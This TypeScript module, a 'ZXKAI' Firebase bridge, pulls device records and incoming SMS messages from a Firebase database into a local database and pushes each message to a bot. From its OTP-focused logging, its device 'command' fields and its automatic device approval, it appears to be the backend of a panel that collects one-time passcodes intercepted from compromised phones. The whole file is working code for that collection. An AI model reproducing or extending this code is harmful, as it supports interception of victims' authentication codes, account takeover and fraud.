/**
 * ZXKAI Firebase Realtime DB Bridge (with API key auth)
 * Structure:
 *   /clients/{deviceId} → { status, battery, sms, action, command, ... }
 *   /messages/{deviceId}/{msgId} → { id, message, sender, dateTime, type }
 */
import https from "node:https";
import { eq } from "drizzle-orm";
import {
  db,
  devicesTable,
  messagesTable,
  panelsTable,
  firebaseConfigsTable,
} from "@workspace/db";
import { notifyNewSMS, notifyDeviceActivity, notifyNumbersChanged } from "../bot/index.js";
import { logger } from "../lib/logger.js";
import { randomBytes } from "node:crypto";

const activeKeys = new Set<string>();
const seenMsgIds = new Set<string>();
const panelIdCache = new Map<string, number>();
const deviceDbIdCache = new Map<string, number>();

function normalizeBase(url: string): string {
  try {
    const p = new URL(url);
    return `${p.protocol}//${p.hostname}`;
  } catch {
    return url.replace(/\/$/, "");
  }
}

async function getOrCreateZxkaiPanel(label: string, firebaseUrl?: string): Promise<number> {
  if (panelIdCache.has(label)) return panelIdCache.get(label)!;
  const existing = await db
    .select({ id: panelsTable.id })
    .from(panelsTable)
    .where(eq(panelsTable.name, label))
    .limit(1);
  if (existing.length) {
    panelIdCache.set(label, existing[0].id);
    if (firebaseUrl) {
      await db
        .update(panelsTable)
        .set({ firebaseUrl })
        .where(eq(panelsTable.id, existing[0].id))
        .catch(() => {});
    }
    return existing[0].id;
  }
  const [panel] = await db
    .insert(panelsTable)
    .values({ name: label, apiKey: randomBytes(24).toString("hex"), firebaseUrl: firebaseUrl ?? null })
    .returning({ id: panelsTable.id });
  panelIdCache.set(label, panel.id);
  return panel.id;
}

async function upsertZxkaiDevice(params: {
  panelId: number;
  firebaseDeviceId: string;
  battery?: string;
  isOnline?: boolean;
  skipNotify?: boolean;
  allowCreate?: boolean;
}): Promise<number | null> {
  const cacheKey = `${params.panelId}::${params.firebaseDeviceId}`;
  const notify = () => { if (!params.skipNotify) notifyNumbersChanged(); };

  if (deviceDbIdCache.has(cacheKey)) {
    const dbId = deviceDbIdCache.get(cacheKey)!;
    const [current] = await db.select({ isOnline: devicesTable.isOnline }).from(devicesTable)
      .where(eq(devicesTable.id, dbId)).limit(1);
    await db
      .update(devicesTable)
      .set({
        isOnline: params.isOnline ?? false,
        lastSeen: new Date(),
        ...(params.battery ? { battery: parseInt(params.battery) || 0 } : {}),
      })
      .where(eq(devicesTable.id, dbId))
      .catch(() => {});
    if (current && current.isOnline !== (params.isOnline ?? false)) {
      void notifyDeviceActivity(params.isOnline ? "online" : "offline", dbId);
    }
    notify();
    return dbId;
  }
  const existing = await db
    .select({ id: devicesTable.id, isOnline: devicesTable.isOnline })
    .from(devicesTable)
    .where(eq(devicesTable.deviceId, params.firebaseDeviceId))
    .limit(1);
  if (existing.length) {
    deviceDbIdCache.set(cacheKey, existing[0].id);
    await db
      .update(devicesTable)
      .set({
        isOnline: params.isOnline ?? false,
        lastSeen: new Date(),
        ...(params.battery ? { battery: parseInt(params.battery) || 0 } : {}),
      })
      .where(eq(devicesTable.id, existing[0].id));
    if (existing[0].isOnline !== (params.isOnline ?? false)) {
      void notifyDeviceActivity(params.isOnline ? "online" : "offline", existing[0].id);
    }
    notify();
    return existing[0].id;
  }
  if (!params.allowCreate) return null;

  const [created] = await db
    .insert(devicesTable)
    .values({
      panelId: params.panelId,
      deviceId: params.firebaseDeviceId,
      phoneNumber: null,
      battery: params.battery ? parseInt(params.battery) || 0 : 0,
      isOnline: params.isOnline ?? false,
      lastSeen: new Date(),
      approvalStatus: "auto",
    })
    .returning({ id: devicesTable.id });
  deviceDbIdCache.set(cacheKey, created.id);
  void notifyDeviceActivity("new", created.id);
  notify();
  return created.id;
}

function startSse(
  baseUrl: string,
  path: string,
  _apiKey: string,
  onEvent: (type: string, payload: { path: string; data: unknown }) => void
): void {
  // NOTE: DO NOT append ?auth= to SSE URL — Firebase SSE returns 401 for invalid tokens
  const url = new URL(`${baseUrl}${path}.json`);
  let retryTimer: NodeJS.Timeout | null = null;
  let retryDelayMs = 3_000;

  function scheduleReconnect() {
    if (retryTimer) return;
    const delay = retryDelayMs;
    retryDelayMs = Math.min(retryDelayMs * 2, 30_000);
    retryTimer = setTimeout(() => {
      retryTimer = null;
      connect();
    }, delay);
  }

  function connect() {
    const req = https.request(
      {
        hostname: url.hostname,
        path: url.pathname + url.search,
        headers: { Accept: "text/event-stream" },
      },
      (res) => {
        const status = res.statusCode ?? 0;
        if (status < 200 || status >= 300) {
          res.resume();
          if ([401, 403, 404, 423].includes(status)) {
            logger.warn({ path, baseUrl, status }, "ZXKAI SSE unavailable; retry disabled for this path");
          } else {
            logger.warn({ path, baseUrl, status }, "ZXKAI SSE unavailable; reconnecting with backoff");
            scheduleReconnect();
          }
          return;
        }

        let buf = "";
        res.on("data", (chunk: Buffer) => {
          buf += chunk.toString();
          const parts = buf.split("\n\n");
          buf = parts.pop() ?? "";
          for (const part of parts) {
            const lines = part.split("\n");
            let type = "message";
            let dataStr = "";
            for (const line of lines) {
              if (line.startsWith("event:")) type = line.slice(6).trim();
              else if (line.startsWith("data:")) dataStr = line.slice(5).trim();
            }
            if (dataStr && type !== "cancel" && type !== "auth_revoked") {
              try {
                onEvent(type, JSON.parse(dataStr) as { path: string; data: unknown });
              } catch {}
            }
          }
        });
        res.on("end", () => {
          logger.warn({ path, baseUrl }, "ZXKAI SSE ended; reconnecting with backoff");
          scheduleReconnect();
        });
        res.on("error", scheduleReconnect);
      }
    );
    req.on("error", scheduleReconnect);
    req.end();
  }
  connect();
}

async function fetchJsonZxkai(baseUrl: string, path: string, apiKey: string): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const [pathPart, queryPart] = path.split("?", 2) as [string, string | undefined];
    const normalPath = pathPart.startsWith("/") ? pathPart : "/" + pathPart;
    const auth = apiKey ? `auth=${encodeURIComponent(apiKey)}` : "";
    const query = [queryPart, auth].filter(Boolean).join("&");
    const url = `${baseUrl}${normalPath}.json${query ? "?" + query : ""}`;
    https
      .get(url, (res) => {
        let body = "";
        res.on("data", (c: Buffer) => (body += c.toString()));
        res.on("end", () => {
          try { resolve(JSON.parse(body)); } catch { resolve(null); }
        });
      })
      .on("error", reject);
  });
}

async function processZxkaiMessage(params: {
  panelLabel: string;
  baseUrl: string;
  apiKey: string;
  deviceFirebaseId: string;
  msgId: string;
  body: string;
  from: string;
  dateMs: number;
}): Promise<void> {
  const key = `zx:${params.deviceFirebaseId}:${params.msgId}`;
  if (seenMsgIds.has(key)) return;
  seenMsgIds.add(key);

  try {
    const panelId = await getOrCreateZxkaiPanel(params.panelLabel, params.baseUrl);
    const dbDeviceId = await upsertZxkaiDevice({
      panelId,
      firebaseDeviceId: params.deviceFirebaseId,
      isOnline: true,
    });

    const [[savedMsg], [device]] = await Promise.all([
      db
        .insert(messagesTable)
        .values({
          deviceId: dbDeviceId!,
          fromNumber: params.from ?? null,
          body: params.body ?? null,
          receivedAt: new Date(params.dateMs),
        })
        .returning({ id: messagesTable.id }),
      db.select().from(devicesTable).where(eq(devicesTable.id, dbDeviceId!)).limit(1),
    ]);

    if (device) {
      void notifyNewSMS({
        device,
        from: params.from,
        body: params.body,
        sim: device.phoneNumber ?? params.deviceFirebaseId,
        timestamp: new Date(params.dateMs),
        messageId: savedMsg.id,
      });
    }

    logger.info(
      { deviceId: params.deviceFirebaseId, from: params.from, body: params.body.slice(0, 40) },
      "ZXKAI OTP saved ✅"
    );
  } catch (err) {
    logger.error({ err, key }, "Failed to process ZXKAI message");
  }
}

export async function startZxkaiListener(cfg: {
  firebaseUrl: string;
  apiKey: string;
  label?: string;
}): Promise<void> {
  const baseUrl = normalizeBase(cfg.firebaseUrl);
  const sessionKey = `${baseUrl}::${cfg.apiKey}`;
  if (activeKeys.has(sessionKey)) return;
  activeKeys.add(sessionKey);

  const panelLabel =
    cfg.label ?? `zxkai_${baseUrl.replace(/https?:\/\//, "").replace(/[^a-z0-9]/gi, "_").slice(0, 20)}`;
  logger.info({ baseUrl, panelLabel }, "ZXKAI: starting listener");

  // Bulk import existing /clients on startup
  const clientsData = (await fetchJsonZxkai(baseUrl, "/clients", cfg.apiKey)) as Record<
    string, Record<string, unknown>
  > | null;

  if (clientsData && typeof clientsData === "object") {
    const panelId = await getOrCreateZxkaiPanel(panelLabel, baseUrl);
    for (const [deviceId, info] of Object.entries(clientsData)) {
      if (!info || typeof info !== "object") continue;
      await upsertZxkaiDevice({
        panelId,
        firebaseDeviceId: deviceId,
        battery: String(info["battery"] ?? ""),
        isOnline: !!info["status"],
        skipNotify: true,
      }).catch(() => {});
    }
    notifyNumbersChanged();
    logger.info({ count: Object.keys(clientsData).length }, "ZXKAI: bulk imported devices");
  }

  // Index existing /messages to avoid double-notifying
  const msgsShallow = (await fetchJsonZxkai(
    baseUrl,
    "/messages",
    cfg.apiKey + "&shallow=true"
  )) as Record<string, true> | null;
  if (msgsShallow) {
    logger.info({ deviceCount: Object.keys(msgsShallow).length }, "ZXKAI: messages index ready");
  }

  // Listen to /clients for online/offline status
  startSse(baseUrl, "/clients", cfg.apiKey, async (type, payload) => {
    if (!payload.data) return;
    const pathParts = payload.path.split("/").filter(Boolean);

    if (pathParts.length === 0) {
      const allClients = payload.data as Record<string, Record<string, unknown>>;
      if (typeof allClients !== "object" || allClients === null) return;
      try {
        const panelId = await getOrCreateZxkaiPanel(panelLabel, baseUrl);
        let changed = false;
        for (const [deviceId, info] of Object.entries(allClients)) {
          if (!info || typeof info !== "object") continue;
          await upsertZxkaiDevice({
            panelId,
            firebaseDeviceId: deviceId,
            battery: String(info["battery"] ?? ""),
            isOnline: !!info["status"],
          }).catch(() => {});
          changed = true;
        }
        if (changed) notifyNumbersChanged();
      } catch {}
      return;
    }

    if (pathParts.length >= 1) {
      const deviceId = pathParts[0];
      const info =
        pathParts.length === 1
          ? (payload.data as Record<string, unknown>)
          : ({ [pathParts[1]]: payload.data } as Record<string, unknown>);
      try {
        const panelId = await getOrCreateZxkaiPanel(panelLabel, baseUrl);
        await upsertZxkaiDevice({
          panelId,
          firebaseDeviceId: deviceId,
          battery: String(info["battery"] ?? ""),
          isOnline: !!info["status"],
        });
      } catch {}
    }
  });

  // Listen to /messages for new OTPs
  startSse(baseUrl, "/messages", cfg.apiKey, (type, payload) => {
    if (!payload.data) return;
    const pathParts = payload.path.split("/").filter(Boolean);

    const processMsg = (deviceId: string, msgId: string, msg: Record<string, unknown>) => {
      const body = String(msg["message"] ?? msg["body"] ?? msg["text"] ?? msg["msg"] ?? "");
      const from = String(msg["sender"] ?? msg["from"] ?? msg["address"] ?? "Unknown");
      let dateMs = Date.now();
      if (typeof msg["id"] === "number") dateMs = msg["id"];
      else if (typeof msg["timestamp"] === "number") dateMs = msg["timestamp"];
      if (!body) return;
      void processZxkaiMessage({
        panelLabel, baseUrl, apiKey: cfg.apiKey,
        deviceFirebaseId: deviceId, msgId, body, from, dateMs,
      });
    };

    if (pathParts.length === 0) {
      const all = payload.data as Record<string, Record<string, unknown>>;
      if (typeof all !== "object" || all === null) return;
      for (const [deviceId, msgs] of Object.entries(all)) {
        if (typeof msgs !== "object" || msgs === null) continue;
        for (const [msgId, msg] of Object.entries(msgs)) {
          if (msg && typeof msg === "object") processMsg(deviceId, msgId, msg as Record<string, unknown>);
        }
      }
    } else if (pathParts.length === 1) {
      const msgs = payload.data as Record<string, Record<string, unknown>>;
      if (typeof msgs === "object" && msgs !== null) {
        for (const [msgId, msg] of Object.entries(msgs)) {
          if (msg && typeof msg === "object") processMsg(pathParts[0], msgId, msg as Record<string, unknown>);
        }
      }
    } else if (pathParts.length === 2) {
      processMsg(pathParts[0], pathParts[1], payload.data as Record<string, unknown>);
    } else if (pathParts.length >= 3) {
      const key = `zx:${pathParts[0]}:${pathParts[1]}`;
      if (!seenMsgIds.has(key)) {
        void fetchJsonZxkai(baseUrl, `/messages/${pathParts[0]}/${pathParts[1]}`, cfg.apiKey).then(
          (msg) => {
            if (msg && typeof msg === "object")
              processMsg(pathParts[0], pathParts[1], msg as Record<string, unknown>);
          }
        );
      }
    }
  });

  logger.info({ baseUrl, panelLabel }, "ZXKAI listener active ✅");
}

export async function loadSavedZxkaiListeners(): Promise<void> {
  const saved = await db.select().from(firebaseConfigsTable);
  for (const cfg of saved) {
    if (!cfg.url.startsWith("zxkai::")) continue;
    const parts = cfg.url.split("::");
    const url = parts[1];
    const key = parts[2] ?? "";
    if (url) {
      startZxkaiListener({
        firebaseUrl: url,
        apiKey: key,
        label: cfg.label ?? undefined,
      }).catch((err) => logger.error({ err, url }, "Failed to load ZXKAI listener"));
    }
  }
}
